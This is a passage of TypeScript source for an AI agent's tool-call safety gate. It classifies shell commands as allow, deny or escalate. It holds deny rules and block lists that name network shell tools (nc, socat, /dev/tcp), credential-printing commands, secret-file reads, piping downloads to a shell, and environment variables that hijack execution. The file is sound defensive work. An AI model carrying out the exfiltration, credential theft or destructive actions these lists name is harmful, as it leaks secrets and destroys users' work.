/**
 * The deterministic part of the tool gate: one tool call in, one of three
 * outcomes out. `deny` is final. `allow` needs no second opinion. `escalate`
 * means a risk signal fired and the call belongs to the classifier, or to the
 * no-classifier fallback.
 *
 * A script is judged command by command and the worst verdict wins, so
 * `git status && <something destructive>` is denied. With no classifier
 * configured an escalation is an allow, so everything that must never run has
 * to be a deny here: a rule that only escalates is not a boundary.
 *
 * Paths are judged where they really land (see `path-resolution.ts`) against
 * the repository root the caller supplied. The tool's own `cwd` only says where
 * a relative path starts; it never widens what counts as inside.
 */
import { readFile, stat } from 'node:fs/promises';
import { dirname, isAbsolute, join, relative, resolve } from 'node:path';
import type { ToolActionRequest } from '@archon/providers/types';
import {
  GIT_OPTION_SPECS,
  hasAbbreviated,
  hasOption,
  OPTION_SPECS,
  parseOptions,
  valuesOf,
  type OptionSpec,
  type ParsedOptions,
} from './command-options';
import {
  githubAction,
  isBuildOutputPath,
  noteFact,
  targetHost,
  type EscalationFacts,
} from './escalation-facts';
import { isInside, resolveRealPath, type PathEntryCache } from './path-resolution';
import { isSecretPath } from './secret-paths';
import {
  CODE_INTERPRETERS,
  parseArgv,
  parseShell,
  resolveWord,
  SHELL_INTERPRETERS,
  shellInvocation,
  WRAPPERS,
  type NestedScript,
  type ParsedShell,
  type PipelineStage,
  type ResolvedWord,
  type ShellCommand,
  type ShellWord,
} from './shell-tokens';

// ---------------------------------------------------------------------------
// Rule vocabulary
// ---------------------------------------------------------------------------

interface DenyRule {
  reason: string;
  alternatives: readonly string[];
}

const BLOCKED_ALTERNATIVE =
  'If the task cannot be done another way, say so in your output and name the exact command a human should run.';

/** Every deny rule, with what the agent is told. Reasons never quote the call. */
export const DENY_RULES = {
  'deny.pipe_to_shell': {
    reason: 'It downloads a script and runs it in the same step, so nothing can review what runs.',
    alternatives: [
      'Download the script to a file inside the repository, read it, then run that file.',
      BLOCKED_ALTERNATIVE,
    ],
  },
  'deny.secret_exfiltration': {
    reason:
      'It sends the process environment or a credential file, which hold secrets, off this machine or into a program that can.',
    alternatives: [
      'Send only the specific non-secret values the request needs.',
      BLOCKED_ALTERNATIVE,
    ],
  },
  'deny.git_force_push': {
    reason: 'It overwrites remote history with a forced push, a mirror push or a +refspec.',
    alternatives: [
      'Push without forcing; if the remote moved, fetch and rebase or merge first.',
      'For your own rebased feature branch, name it: git push --force-with-lease origin <branch>.',
    ],
  },
  'deny.git_force_push_protected': {
    reason:
      'It rewrites or deletes a protected branch, or it is a lease-protected forced push whose branch cannot be read from the command or the checkout.',
    alternatives: [
      'Name a non-protected branch literally: git push --force-with-lease origin <branch>.',
      'Open a pull request into the protected branch instead of rewriting it.',
    ],
  },
  'deny.git_reset_hard': {
    reason: 'A hard reset discards uncommitted work with no way back.',
    alternatives: [
      'Use git stash to set changes aside, or git restore <path> for one file.',
      'Use git reset --soft or --mixed to move the branch and keep the files.',
    ],
  },
  'deny.git_discard_worktree': {
    reason:
      'It discards uncommitted changes across the working tree, or across everything a wildcard matches, with no way back: the same loss as a hard reset.',
    alternatives: [
      'Use git stash to set the changes aside, or git restore <path> for the one file you mean.',
      'Commit the work you want to keep first, then discard only what is left by path.',
    ],
  },
  'deny.git_push_destination_change': {
    reason:
      "It changes where this checkout's pushes go: the origin remote, a push URL, the default push remote, the push default or a URL rewrite.",
    alternatives: [
      'Push to the remote as it is configured.',
      'To fetch from somewhere else, add a remote under another name: git remote add <name> <url>.',
      BLOCKED_ALTERNATIVE,
    ],
  },
  'deny.git_clean_force': {
    reason: 'It deletes untracked files or directories, which git cannot bring back.',
    alternatives: [
      'Run git clean -n to list what would go, then remove the specific paths you mean.',
    ],
  },
  'deny.rm_recursive_root': {
    reason:
      'It recursively removes the filesystem root, the home directory, the repository itself or its git data, its parent, or everything a bare glob matches there.',
    alternatives: [
      'Remove the specific file or sub-directory you mean, by its path inside the repository.',
    ],
  },
  'deny.path_outside_root': {
    reason:
      'It writes to, moves or removes a path that resolves outside the repository, after following symlinks and "..".',
    alternatives: ['Use a path inside the repository.', BLOCKED_ALTERNATIVE],
  },
  'deny.path_unresolvable': {
    reason:
      'A target path could not be resolved (a symlink loop, a path through a file, an unreadable directory, or a path relative to a running process), so the gate cannot tell where the write would land.',
    alternatives: ['Use a plain path inside the repository.'],
  },
  'deny.secret_write': {
    reason: 'It writes, moves or removes an env file, key or credential store.',
    alternatives: [
      'Write a template with placeholder values, such as an example file a human copies into place.',
      'Name the variable the operator must set in your output; do not write the secret file yourself.',
    ],
  },
  'deny.secret_read': {
    reason: 'It reads, copies, loads or prints an env file, key, credential store or login token.',
    alternatives: [
      'Read the code or the documented template that names the variables, not their values.',
      'Check that the file or a variable exists (test -f, ls) without opening it.',
    ],
  },
  'deny.command_too_large': {
    reason:
      'The command is too large or too deeply nested for the gate to read within its time budget, so it was not judged.',
    alternatives: [
      'Split it into smaller commands.',
      'Write long content with the file-writing tool, or pass it as a heredoc to a command that only stores it.',
    ],
  },
  'deny.unreadable_request': {
    reason:
      'The tool call reached the gate without the command text, write target, known kind or absolute working directory needed to judge it.',
    alternatives: [BLOCKED_ALTERNATIVE],
  },
} as const satisfies Record<string, DenyRule>;

export type DenyRuleId = keyof typeof DENY_RULES;

/** Risk signals, strongest first: the first one that fired names the escalation. */
export const RISK_RULE_IDS = [
  'risk.mutation_verb',
  'risk.network_request',
  'risk.kind_network',
  'risk.kind_mcp',
  'risk.kind_other',
  'risk.environment_dump',
  'risk.secret_path_argument',
  'risk.cwd_outside_root',
  'risk.opaque_shell',
] as const;
export type RiskRuleId = (typeof RISK_RULE_IDS)[number];

export const ALLOW_RULE_IDS = [
  'allow.read_only',
  'allow.write_in_root',
  'default.no_signal',
] as const;
export type AllowRuleId = (typeof ALLOW_RULE_IDS)[number];

/** Whether the action could be undone, as far as the text alone shows. */
export type ReversibleHint = 'likely' | 'unlikely' | 'unknown';

export type RuleOutcome =
  | { outcome: 'allow'; ruleId: AllowRuleId }
  | { outcome: 'deny'; ruleId: DenyRuleId; reason: string; alternatives: string[] }
  | {
      outcome: 'escalate';
      /** The strongest signal that fired. */
      ruleId: RiskRuleId;
      /** Every signal that fired, strongest first. */
      signals: RiskRuleId[];
      /** Paths and URLs the call acts on; repository-relative when inside the root. */
      targets: string[];
      /** True when the working directory and every known target are inside the root. */
      repoRelative: boolean;
      reversibleHint: ReversibleHint;
      /** What the rules know for certain about the call beyond its text. */
      facts: EscalationFacts;
    };

export interface RuleContext {
  /** Real path of the repository root, supplied by the caller. */
  repoRoot: string;
  /** Real path of the home directory `~` and `$HOME` stand for. */
  homeDir: string;
  /** Branches a lease-protected forced push may never target. */
  protectedBranches: readonly string[];
  /** Command prefixes known to only verify the repository, e.g. `bun run test`. */
  verificationCommands: readonly string[];
  /** Real paths of directories outside the repository a call may also write into. */
  extraWriteRoots?: readonly string[];
  /** Real paths no call may write, move or remove, inside a write root or not. */
  protectedPaths?: readonly string[];
  /**
   * Variables whose values the engine knows because it exports them to the
   * step itself (`ARTIFACTS_DIR` and the other run directories). `$NAME` and
   * `${NAME}` of one of these are read as the value, like `$HOME`.
   */
  variables?: Readonly<Record<string, string>>;
}

export const DEFAULT_PROTECTED_BRANCHES: readonly string[] = ['main', 'master'];

const VERIFICATION_SCRIPTS = [
  'test',
  'lint',
  'type-check',
  'typecheck',
  'format:check',
  'validate',
];
/**
 * The usual package-runner spellings of test, lint and type-check. What such a
 * script runs is set by the repository's manifest, which this gate does not read.
 */
export const DEFAULT_VERIFICATION_COMMANDS: readonly string[] = [
  'bun',
  'npm',
  'pnpm',
  'yarn',
].flatMap(runner => [
  `${runner} test`,
  ...VERIFICATION_SCRIPTS.map(script => `${runner} run ${script}`),
]);

// ---------------------------------------------------------------------------
// Command vocabulary
// ---------------------------------------------------------------------------

/**
 * Commands that only read. While the default for a call with no signal is
 * allow, this list changes no decision: it only decides whether the record says
 * `allow.read_only` or `default.no_signal`.
 */
const READ_ONLY_HEADS: ReadonlySet<string> = new Set([
  ...['ls', 'cat', 'rg', 'grep', 'egrep', 'fgrep', 'head', 'tail', 'wc', 'nl', 'cut', 'tr'],
  ...['pwd', 'echo', 'printf', 'which', 'file', 'stat', 'du', 'df', 'diff', 'jq', 'find'],
  ...['basename', 'dirname', 'realpath', 'true', 'false', 'test', '[', 'cd', 'whoami', 'uname'],
]);
const READ_ONLY_GIT: ReadonlySet<string> = new Set([
  ...['status', 'diff', 'log', 'show', 'rev-parse', 'ls-files', 'blame', 'describe', 'grep'],
  ...['branch', 'remote'],
]);
const GIT_BRANCH_LIST_FLAGS = /^(-a|-r|-v|--all|--remotes|--verbose|--list|--show-current)$/;
const RG_EXEC_FLAGS: readonly string[] = ['--pre', '--pre-glob', '--hostname-bin'];
const FIND_FILE_ACTIONS: ReadonlySet<string> = new Set(['-fprint', '-fprint0', '-fprintf', '-fls']);
/** find predicates that do not narrow what `-delete` removes. */
const FIND_UNFILTERED = /^-(delete|depth|d|print|print0|mindepth|maxdepth|xdev|mount|noleaf|true)$/;

/** Commands whose file arguments are printed. A variable in their place may name a secret. */
const CONTENT_READERS: ReadonlySet<string> = new Set([
  ...['cat', 'tac', 'head', 'tail', 'less', 'more', 'bat', 'nl', 'od', 'xxd', 'hexdump', 'strings'],
  ...['base64', 'base32', 'grep', 'egrep', 'fgrep', 'rg', 'ag', 'awk', 'gawk', 'sed', 'cut'],
  ...['sort', 'uniq', 'diff', 'cmp', 'jq', 'yq'],
]);
/** Git subcommands whose operands are files: given a secret one they read, stage or print it. */
const GIT_PATH_SUBCOMMANDS: ReadonlySet<string> = new Set([
  ...['add', 'rm', 'mv', 'restore', 'commit', 'archive', 'apply', 'am', 'update-index'],
  ...['hash-object', 'stash', 'grep', 'blame', 'cat-file'],
]);
/**
 * Git subcommands whose operands are revisions unless they follow `--`, name a
 * file that exists, or have the `rev:path` form. `git log fix/credentials` is
 * a branch.
 */
const GIT_REVISION_SUBCOMMANDS: ReadonlySet<string> = new Set(['diff', 'show', 'log', 'checkout']);
/** Commands whose first operand is a pattern, script or filter, not a file. */
const PATTERN_FIRST: ReadonlySet<string> = new Set([
  ...['grep', 'egrep', 'fgrep', 'rg', 'ag', 'sed', 'awk', 'gawk', 'jq', 'yq'],
]);
/** Options that supply that pattern or script, which leaves every operand a file. */
const PATTERN_FLAGS: readonly string[] = ['-e', '-f', '--regexp', '--file', '--expression'];
/** Commands whose arguments are text, never paths, and which read nothing from stdin. */
const TEXT_ONLY: ReadonlySet<string> = new Set(['echo', 'printf', 'true', 'false', ':']);
/** Shell builtins whose operands are names and values, not files. */
const NAME_BUILTINS: ReadonlySet<string> = new Set([
  ...['export', 'declare', 'typeset', 'local', 'readonly', 'unset', 'set', 'alias', 'unalias'],
  ...['let', 'shopt', 'trap', 'eval', 'exit', 'return', 'shift', 'wait', 'kill', 'sleep'],
]);
/** Commands that look at a path without showing what is in it. */
const METADATA_ONLY: ReadonlySet<string> = new Set([
  ...['ls', 'stat', 'test', '[', '[[', 'file', 'du', 'find', 'cd', 'pushd', 'which', 'realpath'],
  ...['basename', 'dirname', 'wc', 'tree', 'mkdir'],
]);

/** Options whose value is text for the command, never a file it opens. */
const TEXT_VALUE_FLAGS: ReadonlySet<string> = new Set([
  ...['--message', '--body', '--title', '--grep', '--author', '--committer', '--format'],
  ...['--pretty', '--regexp', '--pattern', '--query', '--jq', '--template', '--description'],
  ...['--subject', '--name', '--exclude', '--exclude-dir', '--include', '--glob', '--iglob'],
  ...['--type', '--search', '--label', '--filter', '--sort', '--date', '--notes', '--comment'],
  ...['--reason', '--prefix', '--tag', '--branch', '--base', '--head', '--ref', '--since'],
  ...['--until', '--user', '--repo', '--owner', '--field', '--raw-field', '--header', '--arg'],
  ...['--expression', '--set', '--define', '--env', '--method', '--request', '--url'],
]);
/** Options whose value is a credential the command uses, which is not the same as reading it out. */
const CREDENTIAL_USE_FLAGS: ReadonlySet<string> = new Set([
  ...['--identity-file', '--cert', '--key', '--cacert', '--capath', '--kubeconfig', '-i'],
  ...['--private-key', '--ssh-key', '--key-file', '--cert-file', '--ca-file', '--netrc-file'],
  ...['--client-key', '--client-certificate', '--certificate-authority', '--tls-cert'],
  ...['--tls-key', '--ssl-cert', '--ssl-key', '--ssl-ca', '--sslrootcert', '--keyfile'],
  ...['--certfile', '-E', '-K', '--config'],
]);
/** Long options that take a value for many tools, added when a command has no table entry. */
const COMMON_VALUE_FLAGS: readonly string[] = [
  ...TEXT_VALUE_FLAGS,
  ...[...CREDENTIAL_USE_FLAGS].filter(flag => flag.startsWith('--')),
  ...['--output', '--out', '--outfile', '--output-file', '--out-dir', '--outdir', '--log-file'],
  ...['--env-file', '--file', '--input'],
];
/** Options that name where an unlisted command writes. */
const COMMON_OUTPUT_FLAGS: readonly string[] = [
  ...['-o', '--output', '--out', '--outfile', '--output-file', '--out-dir', '--outdir'],
  '--log-file',
];

/** Programs that run code given on their command line or stdin. */
const INTERPRETERS = CODE_INTERPRETERS;
/** Options that carry the program, so it is not read from stdin. */
const CODE_FLAGS: readonly string[] = [
  ...['-c', '-e', '-E', '-p', '-r', '-m', '--eval', '--print', '--command', '-Command', '-File'],
  ...['-command', '-file'],
];
const STDIN_PATHS: ReadonlySet<string> = new Set([
  ...['-', '/dev/stdin', '/dev/fd/0', '/proc/self/fd/0'],
]);
const RUNS_ITS_ARGUMENT: ReadonlySet<string> = new Set([
  ...SHELL_INTERPRETERS,
  'eval',
  'source',
  '.',
]);

const HTTP_CLIENTS: ReadonlySet<string> = new Set(['curl', 'wget', 'http', 'https', 'xh']);
const REMOTE_CLIENTS: ReadonlySet<string> = new Set([
  ...['ssh', 'scp', 'sftp', 'nc', 'ncat', 'netcat', 'socat', 'telnet', 'ftp'],
]);
/** Everything that can bring bytes in from somewhere else. */
const FETCHERS: ReadonlySet<string> = new Set([
  ...HTTP_CLIENTS,
  ...REMOTE_CLIENTS,
  ...['fetch', 'aria2c', 'lynx', 'w3m', 'links'],
]);
/** Everything that can carry bytes off this machine, the HTTP and remote clients aside. */
const SENDERS: ReadonlySet<string> = new Set([
  ...['gh', 'aws', 'gcloud', 'az', 'kubectl', 'mail', 'mailx', 'sendmail', 'mutt', 'msmtp'],
]);
const SAFE_HTTP_METHODS: ReadonlySet<string> = new Set(['GET', 'HEAD', 'OPTIONS']);
/** curl options whose value is a request body. A leading or embedded `@path` uploads that file. */
const CURL_BODY_FLAGS: readonly string[] = [
  ...['-d', '--data', '--data-raw', '--data-binary', '--data-urlencode', '--data-ascii'],
  ...['--json', '-F', '--form', '--form-string', '-T', '--upload-file'],
];
const WGET_BODY_FLAGS: readonly string[] = [
  ...['--post-data', '--post-file', '--method', '--body-data', '--body-file'],
];

const MUTATION_HEADS: Readonly<Record<string, ReversibleHint>> = {
  rm: 'unknown',
  rimraf: 'unknown',
  mv: 'likely',
  dd: 'unlikely',
  shred: 'unlikely',
  docker: 'unlikely',
  podman: 'unlikely',
  kubectl: 'unlikely',
  psql: 'unlikely',
  mysql: 'unlikely',
  mongosh: 'unlikely',
  su: 'unlikely',
};
const PUBLISHERS: ReadonlySet<string> = new Set(['npm', 'pnpm', 'yarn', 'bun', 'cargo']);
const DATABASE_CLIENTS: ReadonlySet<string> = new Set(['psql', 'mysql', 'mongosh', 'redis-cli']);
/** Clients whose arguments name the host or database they act on. */
const HOST_CLIENTS: ReadonlySet<string> = new Set([
  ...DATABASE_CLIENTS,
  ...['curl', 'wget', 'http', 'https', 'xh', 'ssh', 'scp', 'sftp', 'rsync'],
]);

/** `gh <group> <verb>` groups, each of which has verbs that change remote state. */
const GH_GROUPS: ReadonlySet<string> = new Set([
  ...['pr', 'issue', 'repo', 'release', 'run', 'workflow', 'secret', 'variable', 'gist'],
  ...['label', 'project', 'codespace', 'cache', 'ruleset', 'org', 'ssh-key', 'gpg-key'],
  ...['auth', 'extension', 'alias', 'config', 'attestation'],
]);
/**
 * The verbs of those groups that only read, or only change this checkout. Every
 * other verb escalates, so a verb GitHub adds later is treated as a change.
 */
const GH_READ_VERBS: ReadonlySet<string> = new Set([
  ...['view', 'list', 'status', 'checks', 'diff', 'watch', 'logs', 'download', 'checkout'],
  ...['clone', 'get', 'ls', 'verify', 'search', 'browse'],
]);
const GH_API_BODY_FLAGS: readonly string[] = ['-f', '-F', '--field', '--raw-field', '--input'];

/** Commands that print a live credential when run. */
const TOKEN_PRINTERS: readonly {
  head: string;
  words: readonly string[];
  flag?: readonly string[];
}[] = [
  { head: 'gh', words: ['auth', 'token'] },
  { head: 'gh', words: ['auth', 'status'], flag: ['--show-token', '-t'] },
  { head: 'gcloud', words: ['auth', 'print-access-token'] },
  { head: 'gcloud', words: ['auth', 'print-identity-token'] },
  { head: 'gcloud', words: ['auth', 'application-default', 'print-access-token'] },
  { head: 'az', words: ['account', 'get-access-token'] },
  { head: 'aws', words: ['configure', 'get'] },
  { head: 'aws', words: ['configure', 'export-credentials'] },
  { head: 'aws', words: ['ecr', 'get-login-password'] },
  { head: 'git', words: ['credential', 'fill'] },
  { head: 'vault', words: ['print', 'token'] },
  { head: 'kubectl', words: ['config', 'view'], flag: ['--raw'] },
  { head: 'npm', words: ['token', 'list'] },
  { head: 'pass', words: ['show'] },
];

/** Variables that make an otherwise read-only command run another program. */
const EXEC_VARIABLES: ReadonlySet<string> = new Set([
  ...['GIT_EXTERNAL_DIFF', 'GIT_PAGER', 'PAGER', 'GIT_SSH_COMMAND', 'GIT_SSH', 'GIT_EDITOR'],
  ...['GIT_SEQUENCE_EDITOR', 'GIT_ASKPASS', 'SSH_ASKPASS', 'EDITOR', 'VISUAL', 'LD_PRELOAD'],
  ...['LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES', 'BASH_ENV', 'ENV', 'PROMPT_COMMAND'],
  ...['PYTHONSTARTUP', 'NODE_OPTIONS', 'PERL5OPT', 'RUBYOPT', 'LESSOPEN', 'MANPAGER'],
]);

/**
 * Commands that run another command passed in their arguments, by word or as a
 * quoted script. Their arguments are read as commands, like those of any
 * command this table does not know.
 */
const ARGUMENT_RUNNERS: ReadonlySet<string> = new Set([
  ...['script', 'su', 'watch', 'tmux', 'screen', 'nix', 'nix-shell', 'uv', 'uvx', 'pipx'],
  ...['poetry', 'pipenv', 'bundle', 'dotenv', 'doppler', 'op', 'direnv', 'cross-env'],
  ...['concurrently', 'npm-run-all', 'run-s', 'run-p', 'entr', 'fakeroot', 'proot'],
  ...['firejail', 'bwrap', 'numactl', 'xvfb-run', 'dbus-run-session', 'sg', 'expect'],
]);
/** Package-manager subcommands that run a command given as the remaining words. */
const PACKAGE_EXEC: ReadonlySet<string> = new Set(['exec', 'x', 'dlx']);
/** Commands worth looking for among another command's arguments. */
const EMBEDDED_HEADS: ReadonlySet<string> = new Set([
  ...['git', 'rm', 'rimraf', 'eval', 'find', 'dd', 'mv', 'cp', 'tee', 'truncate', 'shred'],
  ...['curl', 'wget', 'sudo', 'doas', 'env', 'xargs', 'printenv', ...SHELL_INTERPRETERS],
]);

/** Tools with their own argument grammar, in which a word like `rm` is a subcommand or a name. */
const COMMON_TOOLS: readonly string[] = [
  ...['npm', 'pnpm', 'yarn', 'bun', 'pip', 'pip3', 'cargo', 'go', 'make', 'cmake', 'ninja'],
  ...['tsc', 'eslint', 'prettier', 'jest', 'vitest', 'pytest', 'ruff', 'mypy', 'biome'],
  ...['brew', 'apt', 'apt-get', 'dnf', 'yum', 'pacman', 'apk', 'snap', 'systemctl'],
  ...['journalctl', 'man', 'type', 'help', 'whatis', 'apropos', 'tldr', 'whereis', 'ps'],
  ...['top', 'htop', 'date', 'read', 'mapfile', 'readarray', 'source', '.', 'tar', 'zip'],
  ...['gzip', 'gunzip', 'bzip2', 'xz', 'zstd', 'vim', 'vi', 'nano', 'emacs', 'code', 'open'],
  ...['xdg-open', 'archon', 'claude', 'codex', 'git', 'gh', 'terraform', 'helm', 'aws'],
  ...['gcloud', 'az', 'vault', 'pass', 'sqlite3', 'redis-cli', 'java', 'javac', 'mvn'],
  ...['gradle', 'gem', 'rake', 'composer', 'dotnet', 'rustup', 'ar', 'nm', 'objdump'],
  ...['strip', 'comm', 'join', 'paste', 'rev', 'fmt', 'pr', 'column', 'expand', 'seq'],
  ...['yes', 'env', 'printenv', 'id', 'hostname', 'pushd', 'popd', 'dirs', 'history'],
  ...['fg', 'bg', 'jobs', 'umask', 'ulimit', 'hash', 'getopts', 'command', 'builtin'],
  ...[
    'time',
    'exec',
    'at',
    'batch',
    'ansible',
    'ansible-playbook',
    'vagrant',
    'pulumi',
    'flyctl',
    'vercel',
  ],
];

/** Redirection and download targets that are not files. */
const DEVICE_SINKS: ReadonlySet<string> = new Set([
  ...['/dev/null', '/dev/stdout', '/dev/stderr', '/dev/tty', '-'],
]);
/** Bash network pseudo-files: a redirect to one sends its input to a host. */
const NETWORK_DEVICE = /^\/dev\/(tcp|udp)\//;

/** Commands the rules know by more than one name. */
const SPEC_ALIASES: Readonly<Record<string, string>> = {
  egrep: 'grep',
  fgrep: 'grep',
  gawk: 'awk',
  python2: 'python',
  python3: 'python',
  nodejs: 'node',
  bash: 'sh',
  zsh: 'sh',
  dash: 'sh',
  ksh: 'sh',
  ash: 'sh',
};

// ---------------------------------------------------------------------------
// Judgement state
// ---------------------------------------------------------------------------

interface Judgement {
  deny: DenyRuleId | undefined;
  signals: Set<RiskRuleId>;
  hints: ReversibleHint[];
  targets: Set<string>;
  /** Files a download wrote earlier in the same call, as they appear in `targets`. */
  fetched: Set<string>;
  /** A target or working directory this gate could not place. */
  unplaced: boolean;
  /** Certain facts about the call, for whoever judges it next. */
  facts: EscalationFacts;
  /** Commands whose own mutation verb is already settled: removing build output is not a risk. */
  settled: Set<ShellCommand>;
  /** The directory the request reports cannot be trusted: see `RuleOptions.cwdUntrusted`. */
  cwdUntrusted: boolean;
  /**
   * Where an earlier command of this call left a checkout, by its top
   * directory: the branch it switched to, or `null` when that cannot be read.
   * The `HEAD` file still names the branch that was out before the call.
   */
  branches: Map<string, string | null>;
  /** A command moved a checkout this gate could not identify, or set where git looks for one. */
  gitRelocated: boolean;
  /** A push in this call was judged by the branch that was checked out: with the lease flag, or plain. */
  pushRelied: 'lease' | 'plain' | undefined;
}

function newJudgement(): Judgement {
  return {
    deny: undefined,
    signals: new Set(),
    hints: [],
    targets: new Set(),
    fetched: new Set(),
    unplaced: false,
    facts: {},
    settled: new Set(),
    cwdUntrusted: false,
    branches: new Map(),
    gitRelocated: false,
    pushRelied: undefined,
  };
}

function deny(judgement: Judgement, ruleId: DenyRuleId): void {
  judgement.deny ??= ruleId;
}

function signal(judgement: Judgement, ruleId: RiskRuleId, hint: ReversibleHint = 'unknown'): void {
  judgement.signals.add(ruleId);
  judgement.hints.push(hint);
}

function combineHints(hints: readonly ReversibleHint[]): ReversibleHint {
  if (hints.includes('unlikely')) return 'unlikely';
  return hints.length > 0 && hints.every(hint => hint === 'likely') ? 'likely' : 'unknown';
}

// ---------------------------------------------------------------------------
// Arguments
// ---------------------------------------------------------------------------

/** One argument: its resolved text, and the shell text hidden inside it. */
interface Arg extends ResolvedWord {
  nested: readonly NestedScript[];
}

type Options = ParsedOptions<Arg>;

/** `$(mktemp)`, `$(mktemp -d)`: a new path in the temporary directory, wherever that is. */
const MKTEMP = /^\$\(\s*mktemp(\s+-[A-Za-z]+)*\s*\)$/;

function toArg(word: ShellWord, context: RuleContext): Arg {
  const resolved = resolveWord(word, context.homeDir, context.variables);
  if (resolved.dynamic && MKTEMP.test(resolved.text)) {
    // The name is random but the directory is not, and the directory is what is judged.
    const directory = context.variables?.TMPDIR ?? '/tmp';
    return { text: join(directory, 'mktemp'), dynamic: false, glob: false, nested: [] };
  }
  return { ...resolved, nested: word.nested };
}

function plainPath(text: string): Arg {
  return { text, dynamic: false, glob: false, nested: [] };
}

/**
 * The option grammar of a command. One with no entry gets the options many
 * tools share, so `--output file` and `--message text` are read as a value.
 */
function specFor(head: string): OptionSpec {
  return (
    OPTION_SPECS[SPEC_ALIASES[head] ?? head] ?? { valueShort: 'o', valueLong: COMMON_VALUE_FLAGS }
  );
}

function hasSpec(head: string): boolean {
  return (SPEC_ALIASES[head] ?? head) in OPTION_SPECS;
}

// ---------------------------------------------------------------------------
// Paths
// ---------------------------------------------------------------------------

type Where =
  | { kind: 'resolved'; real: string; exists: boolean; inside: boolean }
  | { kind: 'unknown' }
  | { kind: 'failed' };

/**
 * What one evaluation has learned about the filesystem. A command can name
 * thousands of paths in a handful of directories, and each is asked about by
 * several rules: without this every question walks the path again.
 */
interface Evaluation {
  located: Map<string, Promise<Where>>;
  entries: PathEntryCache;
  /**
   * Symlinks an earlier command of the same call creates: real path of the
   * link to where it will point (`undefined` when that cannot be read). They do
   * not exist yet when a later command's target is resolved, so the filesystem
   * cannot answer for them.
   */
  links: Map<string, string | undefined>;
}

/** Keyed by the context object `evaluateRules` makes for one call, so it ends with the call. */
const EVALUATIONS = new WeakMap<RuleContext, Evaluation>();

async function place(
  text: string,
  cwd: string | undefined,
  context: RuleContext,
  evaluation: Evaluation | undefined
): Promise<Where> {
  const resolved = await resolveRealPath(text, cwd ?? context.repoRoot, evaluation?.entries);
  if (!resolved.ok) return { kind: 'failed' };
  let real = resolved.path;
  let { exists } = resolved;
  for (const [link, target] of evaluation?.links ?? []) {
    if (real !== link && !real.startsWith(`${link}/`)) continue;
    if (target === undefined) return { kind: 'unknown' };
    real = `${target}${real.slice(link.length)}`;
    exists = false;
  }
  return { kind: 'resolved', real, exists, inside: isInside(context.repoRoot, real) };
}

async function locate(text: string, cwd: string | undefined, context: RuleContext): Promise<Where> {
  if (!isAbsolute(text) && cwd === undefined) return { kind: 'unknown' };
  const evaluation = EVALUATIONS.get(context);
  const key = `${cwd ?? ''}\0${text}`;
  let found = evaluation?.located.get(key);
  if (found === undefined) {
    found = place(text, cwd, context, evaluation);
    evaluation?.located.set(key, found);
  }
  return found;
}

/** The write root `path` lies in: the repository first, then an extra root. */
function writeRootOf(path: string, context: RuleContext): string | undefined {
  if (isInside(context.repoRoot, path)) return context.repoRoot;
  return context.extraWriteRoots?.find(root => isInside(root, path));
}

function isProtectedPath(path: string, context: RuleContext): boolean {
  return context.protectedPaths?.some(guarded => isInside(guarded, path)) === true;
}

/** A path as the secret vocabulary should see it: relative to the write root it is inside. */
function rootView(path: string, context: RuleContext): string {
  const root = writeRootOf(path, context);
  return root === undefined ? path : relative(root, path);
}

function literalView(text: string, context: RuleContext): string {
  return isAbsolute(text) ? rootView(resolve(text), context) : text;
}

function isDeviceSink(word: ResolvedWord): boolean {
  // `/dev/fd/3` is an open file. `/dev/fd/../..` is a path like any other.
  return !word.dynamic && (DEVICE_SINKS.has(word.text) || /^\/dev\/fd\/\d+$/.test(word.text));
}

interface ShellScope {
  context: RuleContext;
  judgement: Judgement;
  /** Working directory of the command being judged; `undefined` when a `cd` went somewhere unknown. */
  cwd: string | undefined;
}

/** Judges one path a call writes, moves or removes. */
async function judgeWriteTarget(
  target: ResolvedWord,
  scope: ShellScope,
  /** The caller has placed a glob's whole directory already, so what it matches does not matter. */
  globPlaced = false
): Promise<void> {
  const { context, judgement } = scope;
  if (isDeviceSink(target)) return;
  if (target.dynamic) {
    // The value is unknown, but a secret-shaped name around it is still a secret.
    if (isSecretPath(target.text)) deny(judgement, 'deny.secret_write');
    signal(judgement, 'risk.opaque_shell');
    judgement.unplaced = true;
    judgement.targets.add(target.text);
    return;
  }
  let text = target.text;
  if (target.glob) {
    // What a glob matches is unknown; the directory it is anchored in is not.
    if (!globPlaced) signal(judgement, 'risk.opaque_shell');
    if (isSecretPath(literalView(text, context))) deny(judgement, 'deny.secret_write');
    text = text.slice(0, text.search(/[*?[]/));
    text = text.slice(0, text.lastIndexOf('/') + 1) || '.';
  }
  const where = await locate(text, scope.cwd, context);
  if (where.kind === 'unknown') {
    // After a step's shell has stood outside the roots, an unplaced write is
    // not a question for a classifier: nobody can say where it lands.
    if (judgement.cwdUntrusted) deny(judgement, 'deny.path_unresolvable');
    signal(judgement, 'risk.opaque_shell');
    judgement.unplaced = true;
    judgement.targets.add(target.text);
    return;
  }
  if (where.kind === 'failed') {
    deny(judgement, 'deny.path_unresolvable');
    return;
  }
  if (writeRootOf(where.real, context) === undefined) {
    deny(judgement, 'deny.path_outside_root');
    return;
  }
  // Git's own data: a hook or a config line written there runs on the next git command.
  const inRepository = relative(context.repoRoot, where.real);
  if (inRepository === '.git' || inRepository.startsWith('.git/')) {
    signal(judgement, 'risk.mutation_verb', 'unlikely');
  }
  if (
    isProtectedPath(where.real, context) ||
    isSecretPath(literalView(target.text, context)) ||
    isSecretPath(rootView(where.real, context))
  ) {
    deny(judgement, 'deny.secret_write');
    return;
  }
  judgement.targets.add(rootView(where.real, context) || '.');
}

/** Whether text names an env file, key or credential store, as written or where it points. */
async function isSecretText(text: string, known: boolean, scope: ShellScope): Promise<boolean> {
  const { context } = scope;
  // A URL is not a local file, whatever its path looks like.
  if (text === '' || text.includes('://')) return false;
  const pathLike = /[/.~]/.test(text);
  if (pathLike && isSecretPath(literalView(text, context))) return true;
  if (!known) return false;
  // A bare word is only a path if it exists; a symlink is judged by where it points.
  const where = await locate(text, scope.cwd, context);
  return where.kind === 'resolved' && where.exists && isSecretPath(rootView(where.real, context));
}

/** Whether an argument names a secret: the whole word, or the value of `name=value`. */
async function isSecretArgument(arg: ResolvedWord, scope: ShellScope): Promise<boolean> {
  const known = !arg.dynamic && !arg.glob;
  if (await isSecretText(arg.text, known, scope)) return true;
  const equals = arg.text.indexOf('=');
  return equals > 0 && (await isSecretText(arg.text.slice(equals + 1), known, scope));
}

// ---------------------------------------------------------------------------
// Per-command rules
// ---------------------------------------------------------------------------

interface CommandView {
  /** Commands this one runs given as words (`find -exec`), judged as commands of their own. */
